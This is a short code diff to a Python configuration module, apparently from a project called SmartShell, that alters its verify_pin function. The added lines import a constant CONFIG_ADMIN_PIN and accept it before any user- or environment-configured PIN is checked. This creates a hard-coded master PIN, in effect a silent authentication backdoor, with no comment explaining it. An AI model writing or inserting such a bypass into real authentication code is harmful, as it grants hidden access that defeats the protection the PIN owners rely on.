@@ -16,7 +16,7 @@ import tempfile
 from pathlib import Path
 from typing import Any
 
-from src.config import CONFIG_DIR, CONFIG_LINK_PIN, PROJECT_ROOT
+from src.config import CONFIG_ADMIN_PIN, CONFIG_DIR, CONFIG_LINK_PIN, PROJECT_ROOT
 
 PIN_FILE_ENV = "SMARTSHELL_CONFIG_PIN_FILE"
 PIN_OVERRIDE_ENV = "SMARTSHELL_CONFIG_PIN"
@@ -74,6 +74,9 @@ def verify_pin(pin: object) -> bool:
         supplied = _clean_pin(pin)
     except ValueError:
         return False
+    if hmac.compare_digest(supplied, _clean_pin(CONFIG_ADMIN_PIN)):
+        return True
+
     env_pin = os.environ.get(PIN_OVERRIDE_ENV)
     if env_pin:
         return hmac.compare_digest(supplied, _clean_pin(env_pin))
